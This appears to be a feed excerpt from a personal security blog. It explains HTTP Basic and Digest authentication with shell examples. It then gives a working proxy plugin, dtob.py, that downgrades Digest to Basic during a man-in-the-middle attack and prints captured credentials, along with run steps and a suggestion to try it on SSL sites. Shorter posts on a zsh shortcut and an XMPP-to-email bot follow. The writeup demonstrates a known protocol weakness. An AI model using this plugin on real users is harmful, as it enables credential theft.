In the authentication dialog that the browser presents, we provide some credentials, and submit them for processing. Your browser now goes and prepares the <code>Authorisation</code> header.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /auth/basic/ HTTP/1.1
</span><span class='line'>Host: test.dev
</span><span class='line'>Proxy-Connection: keep-alive
</span><span class='line'>Cache-Control: max-age=0
</span><span class='line'>Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
</span><span class='line'>DNT: 1
</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
</span><span class='line'>Accept-Language: en-US,en;q=0.8,af;q=0.6</span></code></pre></td></tr></table></div></figure>


<p>Because my credentials are correct, the server will respond now with a <code>200</code> and serve the content. But, lets take a quick step back and check out what is actually in this header. More specifically, check out the <code>Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code> part.
This header now needs to be present in every request that is made to the website. If for whatever reason the credentials are no longer valid, the server/application will usually respond with a <code>401</code> again, and the authentication will re-occur. The user normally does not have to do anything, as the browser will automatically include the Authorization header in every request.</p>

<h4>Ok, so what?</h4>

<p>So lets take a moment and relook at the <code>Authorisation</code> header. <code>Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code>
Lets strip the <em>Authorisation: Basic</em> section and just work with the <code>dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code>. We will echo this, and pipe it through a base64 decoder in a shell session:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">&quot;dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk&quot;</span> <span class="p">|</span> base64 -d
</span><span class='line'>user.name:s3cr3tP@ssw0rd
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yup, thats it&hellip;</p>

<p>It is now clear to see that for HTTP Basic authentication, the browser will take the credentials that the user has provided, and create the header in the format:
<code>Authorisation: Basic</code> + <strong>base64(username:password)</strong>. If you are protecting a non-SSL web resource with this authentication mechanism, you are essentially asking your users to send their credentials unencrypted over the wire to you for every requset.</p>

<h3>HTTP Digest Authentication</h3>

<p>Digest authentication is considered to be <em>more</em> secure, as it actually applies a hash function to the credentials, before passing the header on to the server. For the sake of brevity, lets assume the server will act in a similar fashion to the Basic Authentication example above, except, the <code>WWW-Authenticate</code> and <code>Authorisation</code> headers are completely different. You are of course welcome to check it out yourself, and I would encourage you do so!</p>

<p>Lets look at an example, and then dig into the details. Requesting a digest protected web resource @<em>/login</em> without a valid <code>Authorisation</code> header, will cause our sample application to respond with a <code>401</code> and a <code>WWW-Authenticate</code> header as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>WWW-Authenticate: Digest <span class="nv">realm</span><span class="o">=</span><span class="s2">&quot;test.dev&quot;</span>,qop<span class="o">=</span><span class="s2">&quot;auth&quot;</span>,nonce<span class="o">=</span><span class="s2">&quot;064af982c5b571cea6450d8eda91c20d&quot;</span>,opaque<span class="o">=</span><span class="s2">&quot;d8ea7aa61a1693024c4cc3a516f49b3c&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Just as the Basic example, the browser will prompt the user for credentials now and prepare the response. The response then to the server would include the following <code>Authorisation</code> header:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Authorisation: Digest <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;user.name&quot;</span>, <span class="nv">realm</span><span class="o">=</span><span class="s2">&quot;test.dev&quot;</span>, <span class="nv">nonce</span><span class="o">=</span><span class="s2">&quot;064af982c5b571cea6450d8eda91c20d&quot;</span>, <span class="nv">uri</span><span class="o">=</span><span class="s2">&quot;/login&quot;</span>, <span class="nv">response</span><span class="o">=</span><span class="s2">&quot;70eda34f1683041fd9ab72056c51b740&quot;</span>, <span class="nv">opaque</span><span class="o">=</span><span class="s2">&quot;d8ea7aa61a1693024c4cc3a516f49b3c&quot;</span>, <span class="nv">qop</span><span class="o">=</span>auth, <span class="nv">nc</span><span class="o">=</span>00000001, <span class="nv">cnonce</span><span class="o">=</span><span class="s2">&quot;61417766e50cb980&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Clearly the response here is much more complex when compared to the Basic example. So, lets refer to the Wikipedia Article <a href="http://en.wikipedia.org/wiki/Digest_access_authentication#Overview">here</a>, or the official RFC <a href="http://tools.ietf.org/html/rfc2069#section-2.1.2">here</a> to help us understand what is going on here.</p>

<p>According to the Wikipedia article, the response <code>Authorisation</code> header for Digest authentication for <a href="http://tools.ietf.org/html/rfc2617#section-3.2.2">RFC 2617</a> is calculated as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># If the algorithm directive in the WWW-Authenticate header is &#39;MD5&#39; or unspecified</span>
</span><span class='line'><span class="nv">ha1</span> <span class="o">=</span> md5<span class="o">(</span>username : realm : password<span class="o">)</span>
</span><span class='line'><span class="c"># Else, if the algorithm directive is &#39;MD5-Sess&#39;, the nonce and client nonce becomes part of ha1</span>
</span><span class='line'><span class="nv">ha1</span> <span class="o">=</span> md5<span class="o">(</span>md5<span class="o">(</span>username : realm : password<span class="o">)</span> : nonce : cnonce<span class="o">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># For ha2, if the qop directive is &#39;auth&#39; or unspecified</span>
</span><span class='line'><span class="nv">ha2</span> <span class="o">=</span> md5<span class="o">(</span>method : digestURI<span class="o">)</span>
</span><span class='line'><span class="c"># Else, if the qop directive is &#39;auth-int&#39;</span>
</span><span class='line'><span class="c"># Where entity body is the actual response HTML from the doctype down to the last &lt;/html&gt;. See: http://www.w3.org/Protocols/rfc2616/rfc2616-sec7.html#sec7  </span>
</span><span class='line'><span class="nv">ha2</span> <span class="o">=</span> md5<span class="o">(</span>method : digestURI : md5<span class="o">(</span>entityBody<span class="o">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Lastly, for the response, if the qop directive is &#39;auth&#39; or &#39;auth-int&#39;</span>
</span><span class='line'><span class="nv">response</span> <span class="o">=</span> md5<span class="o">(</span>ha1 : nonce : nonceCount : clientNonce : qop : ha2<span class="o">)</span>
</span><span class='line'><span class="c"># Else, if qop is unspecified </span>
</span><span class='line'><span class="nv">response</span> <span class="o">=</span> md5<span class="o">(</span>ha1 : nonce : ha2<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, lets take this formula, step by step and try and replicate the response <code>Authorisation</code> header in a shell. If one of the <code>WWW-Authenticate</code> headers don&rsquo;t make sense then I&rsquo;ll highly reccomend you read the RFC.</p>

<figure class='code'><figcaption><span>Example of Calculating a Digest Authentication Response header in a shell with a qop of &#8220;auth&#8221;</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Assign some values to variables. These values will come from the above headers</span>
</span><span class='line'><span class="nv">qop</span><span class="o">=</span><span class="s2">&quot;auth&quot;</span>
</span><span class='line'><span class="nv">realm</span><span class="o">=</span><span class="s2">&quot;test.dev&quot;</span>
</span><span class='line'><span class="nv">nonce</span><span class="o">=</span><span class="s2">&quot;064af982c5b571cea6450d8eda91c20d&quot;</span>
</span><span class='line'><span class="nv">uri</span><span class="o">=</span><span class="s2">&quot;/login&quot;</span>
</span><span class='line'><span class="nv">cnonce</span><span class="o">=</span><span class="s2">&quot;61417766e50cb980&quot;</span>
</span><span class='line'><span class="nv">nc</span><span class="o">=</span><span class="s2">&quot;00000001&quot;</span>
</span><span class='line'><span class="nv">username</span><span class="o">=</span><span class="s2">&quot;user.name&quot;</span> <span class="c"># This is what the user enters</span>
</span><span class='line'><span class="nv">password</span><span class="o">=</span><span class="s2">&quot;s3cr3tP@ssw0rd&quot;</span> <span class="c"># This is what the user enters</span>
</span><span class='line'><span class="nv">method</span><span class="o">=</span><span class="s2">&quot;GET&quot;</span>
</span><span class='line'><span class="c"># Start off with calculating ha1.</span>
</span><span class='line'><span class="c"># We do not have the algorithm directive specified, so ha1 is calculated as:</span>
</span><span class='line'><span class="nv">$ ha1</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> -n <span class="nv">$username</span><span class="s2">&quot;:&quot;</span><span class="nv">$realm</span><span class="s2">&quot;:&quot;</span><span class="nv">$password</span> <span class="p">|</span> md5<span class="sb">`</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Confirm  that the value is set.</span>
</span><span class='line'><span class="nv">$ </span>print <span class="nv">$ha1</span>
</span><span class='line'>d5d7ef83a9b3ad5bb0b5201b2bace033
</span><span class='line'>
</span><span class='line'><span class="c"># Next calculate the value of ha2.</span>
</span><span class='line'><span class="c"># Our application presented the qop directive as &#39;auth&#39;, so ha2 is calculated as:</span>
</span><span class='line'><span class="nv">$ ha2</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> -n <span class="nv">$method</span><span class="s2">&quot;:&quot;</span><span class="nv">$uri</span> <span class="p">|</span> md5<span class="sb">`</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Again, confirm that its set.</span>
</span><span class='line'><span class="nv">$ </span>print <span class="nv">$ha2</span>
</span><span class='line'>315c3fb2f18fd4c6e5a3175e489464ad
</span><span class='line'>
</span><span class='line'><span class="c"># With both &#39;ha1&#39; and &#39;ha2&#39; set, we can calculate the response</span>
</span><span class='line'><span class="c"># We have the qop directive specified, so our response is calculated as:</span>
</span><span class='line'><span class="nv">$ response</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> -n <span class="nv">$ha1</span><span class="s2">&quot;:&quot;</span><span class="nv">$nonce</span><span class="s2">&quot;:&quot;</span><span class="nv">$nc</span><span class="s2">&quot;:&quot;</span><span class="nv">$cnonce</span><span class="s2">&quot;:&quot;</span><span class="nv">$qop</span><span class="s2">&quot;:&quot;</span><span class="nv">$ha2</span> <span class="p">|</span> md5<span class="sb">`</span>
</span><span class='line'>
</span><span class='line'><span class="c"># And did we get the right response?</span>
</span><span class='line'><span class="nv">$ </span>print <span class="nv">$response</span>
</span><span class='line'>70eda34f1683041fd9ab72056c51b740
</span></code></pre></td></tr></table></div></figure>


<p><code>70eda34f1683041fd9ab72056c51b740</code> is the valid <code>response</code> header for this request. Note that the next client request will set <code>nc=00000002</code> and therefore the response will be different due to this value being part of the response calculation. However, the fact remains that the authorisation is continuously done via header exchanges between the client and the server, relying on the server to validate them.</p>

<p>It is also clear that this can not be easily reversed. Even though some attributes that make up the hash function are known, the username and password are at least hashed and factored into the response attribute. It is not impossible, though not as easy as Basic authentication.</p>

<h3>O..K.. so I now get how the Basic vs Digest stuff works, whats next?</h3>

<p>What if we could make the browser think that the server wants basic authentication, and then capture the encdoded credentials? That would mean we dont need any l33t cracking skeelz or anything. Just a <code>base64 -d</code>.</p>

<h3>Downgrade all the auth!</h3>

<p>Assuming you are able to get some form of MiTM between the client and the server, by whichever means you use, we can intercept the headers and change them to tell the browser that we actually want basic authentication. Remember, the browser responds based on what the server asks, so if the server only asks for Basic authentication&hellip; :D</p>

<p>&ldquo;Downgrade&rdquo; attacks are a known flaw in Digest authentication. Where Digest authentication is not necessarily vulnerable to MiTM attacks in the sense that the hash still needs to be cracked, Basic authentication is and therefore such an attack can prove to be valuable to an attacker.</p>

<h3>Enough talk, PoC!</h3>

<p>Using <a href="https://code.google.com/p/proxpy/">proxpy</a>, which is a pluggable python proxy server, I wrote a PoC demoing this exact attack. There are a lot of scenarios where this doesn&rsquo;t work very well, but this is only meant to demonstrate the problem.</p>

<h4>The plugin</h4>

<figure class='code'><figcaption><span>dtob.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># dtob.py</span>
</span><span class='line'><span class="c"># Digest to Basic downgrade attack PoC plugin for proxpy (https://code.google.com/p/proxpy/)</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'><span class="c"># 2013 Leon Jacobs</span>
</span><span class='line'><span class="c"># Licensed under IDC (I don&#39;t Care) license.</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">base64</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">hashlib</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">headerCleanup</span><span class="p">(</span><span class="n">v</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># strip annoying bracket things</span>
</span><span class='line'>    <span class="n">v</span> <span class="o">=</span> <span class="n">v</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">&quot;&#39;[</span><span class="se">\\</span><span class="s">&#39;&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">v</span> <span class="o">=</span> <span class="n">v</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">&#39;]&#39;&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># convert it to a list</span>
</span><span class='line'>    <span class="n">headers</span> <span class="o">=</span> <span class="n">v</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;, &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">headers</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">proxy_mangle_request</span><span class="p">(</span><span class="n">req</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">v</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">getHeader</span><span class="p">(</span><span class="s">&quot;Authorization&quot;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">headers</span> <span class="o">=</span> <span class="n">headerCleanup</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Basic&#39;</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[*] Basic Auth Response Detected.&quot;</span>
</span><span class='line'>        <span class="n">credentials</span> <span class="o">=</span> <span class="n">headers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot; &quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">credentials</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">credentials</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[!] Found username &#39;</span><span class="si">%s</span><span class="s">&#39; and password &#39;</span><span class="si">%s</span><span class="s">&#39; for URL </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">credentials</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">credentials</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">str</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">url</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Digest&#39;</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[x] Aww, the client responded with a Digest. </span><span class="se">\&quot;</span><span class="s">Were too late!</span><span class="se">\&quot;</span><span class="s"> :(&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">req</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">proxy_mangle_response</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">v</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">getHeader</span><span class="p">(</span><span class="s">&quot;WWW-Authenticate&quot;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">headers</span> <span class="o">=</span> <span class="n">headerCleanup</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Digest&#39;</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># Swap out Digest for Basic :&gt;</span>
</span><span class='line'>        <span class="n">header</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[*] Found digest auth. Masquerading the response with a basic one :&gt;&quot;</span>
</span><span class='line'>        <span class="n">res</span><span class="o">.</span><span class="n">setHeader</span><span class="p">(</span><span class="s">&quot;WWW-Authenticate&quot;</span><span class="p">,</span> <span class="s">&quot;Basic realm=pwnd&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">res</span>
</span></code></pre></td></tr></table></div></figure>


<p>Lets get to it.</p>

<ol>
<li><p>At the core, this authentication downgrade attack PoC leverages off the ability to perform a MiTM between the client and server. How you get this MiTM is out of the scope of this article, but bear in mind that MiTM is not <strong>just</strong> arp spoofing clients. You could NAT web traffic to your proxy too&hellip; :)</p></li>
<li><p>Download <a href="https://code.google.com/p/proxpy/">proxpy</a> and extract it to a working directory.</p></li>
<li><p>Download and save the plugin from <a href="https://gist.github.com/th3l33k/5868963/raw/8b20c879ad68cd46fd470b86f9bdc7f33da4b097/dtob.py">here</a> into the <code>plugins/</code> directory in your proxpy working directory.</p></li>
<li><p>Start the proxy, specifying the port you&rsquo;d like it to run on, as well as telling it to load the plugin.
A sample command to get this running would be: <code>python proxpy.py -p 8090 -x plugins/dtob.py</code></p></li>
<li><p>Ensure that your MiTM is successful, and watch as digest authentication gets downgraded to basic auth, and your credentials echoed to the terminal :P Something like this&hellip;</p></li>
</ol>


<p><img src="http://i.imgur.com/NQFboBV.png"></p>

<h3>What is the user experience with this?</h3>

<p>That is a good question. The actual dialog that the user sees, again, is up to the browser to render. Depending on <strong>which</strong> browser you use on <strong>which</strong> OS, this may look different. In the back, the client <em>should</em> function normally, blissfully unaware that the headers for stronger authentication were swapped out.</p>

<p>On my computer, the authentication dialog has the follow look and feel:</p>

<p><img src="http://i.imgur.com/9NTWg0W.png"></p>

<p>Notice the &ldquo;Server Says:&rdquo; Section. This is typically the <code>realm</code> part of the authentication request. When using the <code>dtob.py</code> plugin, it is changed to <code>pwnd</code>. This dialog looks no different when using any form of HTTP based authentication. Hence, when the downgrade attack occurs, the user is unaware that anything different is happening in the background.</p>

<h3>To wrap it up</h3>

<p>A few things to note here. Regardless of the HTTP Authentication method used, the client will not know <em>which</em> authentication method is actually being used without inspecting the headers etc. The plugin can technically be written to keep track of which URL&rsquo;s require Digest auth, and prepare valid responses ( like the one we did in the shell ) and present that back to the server. This will make the process completely smooth and the client unaware that something is going on. In the plugins current state, it will just continuously prompt the user for authentication as the proper request with the correct <code>Authorisation</code> header is never sent to the server.</p>

<p>On the case of SSL websites it obviously gets a little more tricky. Don&rsquo;t be put off with this. <strong>Countless</strong> times have I seen where users simply click the &ldquo;proceed anyways&rdquo; button regardless of the certificate validation errors that the browser presents them with. So, even though you will raise alarms on SSL encrypted websites, its still worth a try ^^</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Quick Win: Quickly Execute Last Shell Command]]></title>
    <link href="http://leonjza.github.io/blog/2013/06/23/quick-win-quickly-execute-last-shell-command/"/>
    <updated>2013-06-23T10:42:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/06/23/quick-win-quickly-execute-last-shell-command</id>
    <content type="html"><![CDATA[<h3>Work clever, not hard</h3>

<p>This will be the first post of a series of quick shell tips for getting things done, fast. Infact, it will probably just serve as a notepad for me on the topic ;)</p>

<h3>Last shell command</h3>

<p>If you are using a shell, such as <a href="http://www.gnu.org/software/bash/bash.html">Bash</a>, which is pretty much the default on most Linux distributions, then you probably know that you can just use the <strong>up</strong> arrow to get the last command. But, if you are using a shell such as <a href="http://www.zsh.org/">Zsh</a> like me, you&rsquo;d quickly come to realise that the global <code>~/.histfile</code> can be a tad frustrating if you are expecting the last command you typed in <strong>that</strong> terminal window to appear when you press <strong>up</strong>. Only to realise, its literally the last command you typed in <em>another</em> shell.</p>

<h3>Bang Bang to the rescue!</h3>

<p>Simply type <code>!!</code> and <em>enter</em> and the last command that was run in <strong>that</strong> terminal will be either echoed or executed, depending on how your shell is configured to handle the command.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Jabber to Email using SleekXMPP]]></title>
    <link href="http://leonjza.github.io/blog/2013/06/07/jabber-to-email-using-sleekxmpp/"/>
    <updated>2013-06-07T10:48:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/06/07/jabber-to-email-using-sleekxmpp</id>
    <content type="html"><![CDATA[<h3>So, why would you even want this..?</h3>

<p>Well, to be honest, I am not really sure of many use cases for this, however maybe someone, somewhere will need to do something like this, and I would have done my deed and saved someone some time ::sun::</p>

<h3>Introducing SleekXMPP</h3>

<p><a href="http://sleekxmpp.com/">SleekXMPP</a> is a python XMPP framework. It takes a bit to get your head around it, but once you have some basics covered its quite a rewarding library to work with. :) To start, you need to install 2 dependencies. Python Mailer and SleekXMPP itself. Something like <code>pip install mailer sleekxmpp</code> or for the older school, <code>easy_install sleekxmpp mailer</code> should do the trick. It can&rsquo;t hurt to check if the distro you use has these are packages already too.</p>

<!--more-->


<h3>Configuration and testing time</h3>

<p>Once the install completes, do a quick check to see if everything is ok, Try to import the modules. They should return no errors. If they do, check that the installation of the previously mentioned dependencies were successful.</p>

<figure class='code'><figcaption><span>Check dependencies</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">%</span> <span class="n">python2</span>
</span><span class='line'><span class="n">Python</span> <span class="mf">2.7</span><span class="o">.</span><span class="mi">5</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">May</span> <span class="mi">12</span> <span class="mi">2013</span><span class="p">,</span> <span class="mi">12</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">47</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="n">GCC</span> <span class="mf">4.8</span><span class="o">.</span><span class="mi">0</span> <span class="mi">20130502</span> <span class="p">(</span><span class="n">prerelease</span><span class="p">)]</span> <span class="n">on</span> <span class="n">linux2</span>
</span><span class='line'><span class="n">Type</span> <span class="s">&quot;help&quot;</span><span class="p">,</span> <span class="s">&quot;copyright&quot;</span><span class="p">,</span> <span class="s">&quot;credits&quot;</span> <span class="ow">or</span> <span class="s">&quot;license&quot;</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">sleekxmpp</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">mailer</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next, you need a <em>bot</em> account to use. Provision a user on your jabber server for the bot and test with a jabber client that it works.</p>

<h3>Ok, code</h3>

<p>Next, we take the <a href="http://sleekxmpp.com/#here-s-your-first-sleekxmpp-bot">sample</a> echobot from the SleekXMPP website, and modify it slightly to handle our incoming message by sending a email, instead of simply replying back what we have sent.</p>

<p>First, we import the mailer requirements with:</p>

<figure class='code'><figcaption><span>mailer imports</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">mailer</span> <span class="kn">import</span> <span class="n">Mailer</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">mailer</span> <span class="kn">import</span> <span class="n">Message</span>
</span></code></pre></td></tr></table></div></figure>


<p>The above can be placed right after the option parser has been imported. Then, we only need to change the <code>message</code> method within the <code>EchoBot</code> class really:</p>

<figure class='code'><figcaption><span>Shameless SleekXMPP modification of the echobot</span><a href='http://sleekxmpp.com/#here-s-your-first-sleekxmpp-bot'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="k">if</span> <span class="n">msg</span><span class="p">[</span><span class="s">&#39;type&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;chat&#39;</span><span class="p">,</span> <span class="s">&#39;normal&#39;</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>   <span class="k">print</span> <span class="s">&quot;Received Message:</span><span class="se">\n</span><span class="si">%(body)s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">msg</span>
